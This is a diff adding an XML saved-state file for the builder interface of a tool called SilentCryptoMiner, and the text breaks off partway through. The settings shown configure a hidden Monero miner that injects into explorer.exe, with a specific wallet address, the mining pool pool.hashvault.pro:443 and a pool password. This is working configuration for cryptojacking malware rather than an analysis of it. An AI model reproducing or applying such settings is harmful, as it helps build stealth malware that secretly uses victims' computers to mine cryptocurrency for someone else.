@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="windows-1251"?>
+<Form>
+  <Control Type="MephTheme" Name="formBuilder">
+    <Visible>True</Visible>
+    <Enabled>True</Enabled>
+    <Control Type="MephTabcontrol" Name="tabcontrolBuilder">
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabMain">
+        <Visible>True</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephComboBox" Name="comboLanguage">
+          <Text>Russian</Text>
+          <SelectedIndex>4</SelectedIndex>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnLoadState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnSaveState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephListBox" Name="listMiners">
+          <Item Type="SilentCryptoMiner.MinerXMR">
+            <Control Type="MephTheme" Name="formMinerXMR">
+              <Visible>True</Visible>
+              <Enabled>True</Enabled>
+              <Control Type="MephTabcontrol" Name="tabcontrolMinerXMR">
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephComboBox" Name="comboInjection">
+                    <Text>explorer.exe</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolUsername">
+                    <Text>49qY3dG4hoZUz77o5Uvhwyb8ZbMsWSTYaAEKeDwBmcBxFSKtaghzmkSUYDFDamwLQcGizz8D5pUEjcod5J6dquyh3oyrxtz</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolURL">
+                    <Text>pool.hashvault.pro:443</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolPassword">
+                    <Text>123qwe</Text>
